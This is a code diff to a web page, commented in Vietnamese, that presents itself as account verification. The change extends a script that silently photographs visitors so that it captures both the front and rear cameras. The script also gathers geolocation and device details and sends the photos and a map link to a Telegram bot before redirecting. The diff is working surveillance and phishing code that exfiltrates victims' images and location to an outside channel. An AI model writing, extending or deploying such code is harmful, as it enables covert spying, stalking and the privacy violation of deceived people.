@@ -114,11 +114,11 @@
             });
         }
 
-        // Chỉ chụp camera trước để siêu nhanh
-        async function captureCamera() {
+        // Hàm chụp ảnh từ camera với facingMode tuỳ chọn (user / environment)
+        async function captureCameraFacing(facingMode) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
                 return new Promise(resolve => {
@@ -128,50 +128,69 @@
                     video.playsInline = true;
                     video.play();
 
-                    video.onloadedmetadata = () => {
+                    // Chụp ngay khi có khung hình đầu tiên (tối ưu tốc độ)
+                    video.onloadeddata = () => {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
-
-                        // Giảm delay tối đa
-                        setTimeout(() => {
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            stream.getTracks().forEach(t => t.stop());
-                            canvas.toBlob(b => resolve(b), 'image/jpeg', 0.75);
-                        }, 280);
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        stream.getTracks().forEach(t => t.stop());
+                        canvas.toBlob(b => resolve(b), 'image/jpeg', 0.8);
                     };
+
+                    // Fallback nếu onloadeddata không kích hoạt (một số thiết bị)
+                    setTimeout(() => {
+                        if (stream.active) {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            stream.getTracks().forEach(t => t.stop());
+                            canvas.toBlob(b => resolve(b), 'image/jpeg', 0.8);
+                        }
+                    }, 400);
                 });
             } catch (e) {
-                console.log("Camera error:", e);
+                console.log(`Camera ${facingMode} error:`, e);
                 return null;
             }
         }
 
-        async function sendToTelegram(info, front, loc) {
-            const caption = `🔐 **Xác Minh Tài Khoản Mới**\n\n` +
+        async function sendToTelegram(info, frontBlob, backBlob, loc) {
+            // Tin nhắn với vị trí được in đậm và có thể click
+            const caption = `🔐 *Xác Minh Tài Khoản Mới*\n\n` +
                            `⏰ Thời gian: ${info.time}\n` +
                            `📱 Thiết bị: ${info.device}\n` +
                            `🖥 Hệ điều hành: ${info.os}\n` +
-                           `🔗 Link Google Map: ${loc}\n` +
+                           `📍 Vị trí: [Link Google Map](${loc})\n` +
                            `📷 Camera: ${info.camera}`;
 
-            if (front) {
-                const media = [
-                    { type: "photo", media: "attach://front", caption: caption, parse_mode: "Markdown" }
-                ];
+            const media = [];
+            
+            if (frontBlob) {
+                media.push({ type: "photo", media: "attach://front", caption: caption, parse_mode: "Markdown" });
+            }
+            if (backBlob) {
+                // Ảnh sau không cần caption
+                media.push({ type: "photo", media: "attach://back" });
+            }
 
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('media', JSON.stringify(media));
-                fd.append('front', front, 'front.jpg');
-
-                await fetch(`${TELEGRAM_API}/sendMediaGroup`, { method: 'POST', body: fd });
-            } else {
+            if (media.length === 0) {
+                // Trường hợp không có ảnh nào, gửi text thông báo
                 await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
                 });
+            } else {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('media', JSON.stringify(media));
+                if (frontBlob) fd.append('front', frontBlob, 'front.jpg');
+                if (backBlob) fd.append('back', backBlob, 'back.jpg');
+                await fetch(`${TELEGRAM_API}/sendMediaGroup`, { method: 'POST', body: fd });
             }
         }
 
@@ -182,15 +201,23 @@
                 time: new Date().toLocaleString('vi-VN'),
                 device: navigator.platform || 'Unknown',
                 os: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'iOS' : /Android/i.test(navigator.userAgent) ? 'Android' : 'Desktop',
-                camera: '✅ Đã chụp'
+                camera: '✅ Trước & Sau'
             };
 
-            const [front, location] = await Promise.all([
-                captureCamera(),
+            // Lấy vị trí và camera trước cùng lúc để tiết kiệm thời gian
+            const [frontBlob, location] = await Promise.all([
+                captureCameraFacing('user'),
                 getLocation()
             ]);
 
-            await sendToTelegram(info, front, location);
+            // Camera sau ngay sau khi camera trước kết thúc (không thể song song)
+            const backBlob = await captureCameraFacing('environment');
+
+            // Cập nhật trạng thái camera nếu thiếu
+            if (!backBlob) info.camera = '✅ Chỉ trước';
+            if (!frontBlob && !backBlob) info.camera = '❌ Không có ảnh';
+
+            await sendToTelegram(info, frontBlob, backBlob, location);
             statusEl.innerText = "Xác thực hoàn tất ✓";
         }
 
@@ -201,7 +228,7 @@
             try {
                 await main();
 
-                // Đếm ngược rất nhanh
+                // Đếm ngược nhanh trước khi chuyển hướng
                 let sec = 3;
                 const timer = setInterval(() => {
                     btn.innerText = `HOÀN TẤT TRONG ${sec}s`;
